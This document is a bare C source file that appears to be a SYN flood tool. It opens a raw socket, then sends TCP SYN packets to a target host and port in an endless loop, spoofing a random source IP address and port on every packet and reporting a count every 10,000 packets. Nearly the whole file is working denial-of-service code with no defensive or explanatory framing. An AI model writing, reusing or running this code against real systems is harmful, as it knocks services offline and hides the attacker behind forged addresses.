#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <stdio.h>
#include <netdb.h>
#define LOCALPORT 10329


void send_tcp(int sockfd,struct sockaddr_in *addr);
unsigned short check_sum(unsigned short *addr,int len);

int main(int argc,char **argv){
    int sockfd;
    struct sockaddr_in addr;
    struct hostent *host;
    int on=1;
    int destport=80;
    if(argc<2){
        printf("\nUsage:%s hostIP port\n",argv[0]);
        exit(1);
    }
    
    bzero(&addr,sizeof(struct sockaddr_in));
    addr.sin_family=AF_INET;
    if(argc==3){
        destport=atoi(argv[2]);
    }
    addr.sin_port=htons(destport);
    if(inet_aton(argv[1],&addr.sin_addr)==0){
        host=gethostbyname(argv[1]);
        if(host==NULL){
            fprintf(stderr,"HostName Error:%s\n\a",hstrerror(h_errno));
            exit(1);
        }
        addr.sin_addr=*(struct in_addr *)(host->h_addr_list[0]);
    }
    sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
    if(sockfd<0){
        fprintf(stderr,"Socket Error:%s\n\a",strerror(errno));
        exit(1);
    }
    setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
    setuid(getpid());
    send_tcp(sockfd,&addr);
}

void send_tcp(int sockfd,struct sockaddr_in *addr){
    char buffer[100];
    struct ip *ip;
    struct tcphdr *tcp;
    int head_len;

    head_len=sizeof(struct ip)+sizeof(struct tcphdr);
    bzero(buffer,100);

    ip=(struct ip *)buffer;
    ip->ip_v=IPVERSION;
    ip->ip_hl=sizeof(struct ip)>>2;
    ip->ip_tos=0;
    ip->ip_len=htons(head_len);
    ip->ip_id=0;
    ip->ip_off=0;
    ip->ip_ttl=MAXTTL;
    ip->ip_p=IPPROTO_TCP;
    ip->ip_sum=0;
    ip->ip_dst=addr->sin_addr;

    tcp=(struct tcphdr *)(buffer + sizeof(struct ip));
    tcp->dest=addr->sin_port;
    tcp->doff=5;
    tcp->syn=1;
    tcp->ack_seq=0;
    tcp->check=0;
    tcp->seq=random();

    int count=1;
    while(1){
        ip->ip_src.s_addr=random();
        tcp->source=random();//htons(LOCALPORT);//
        if(count%10000==0) printf("Send %d packets\n",count);
        count++;
        tcp->check=check_sum((unsigned short *)tcp,sizeof(struct tcphdr));
        sendto(sockfd,buffer,head_len,0,addr,sizeof(struct sockaddr_in));
        
    }
}

unsigned short check_sum(unsigned short *addr,int len){
    register int nleft=len;
    register int sum=0;
    register short *w=addr;
    short answer=0;

    while(nleft>1){
        sum+=*w++;
        nleft-=2;
    }
    if(nleft==1){
        *(unsigned char *)(&answer)=*(unsigned char *)w;
        sum+=answer;
    }

    sum=(sum>>16)+(sum&0xffff);
    sum+=(sum>>16);
    answer=~sum;
    return(answer);
}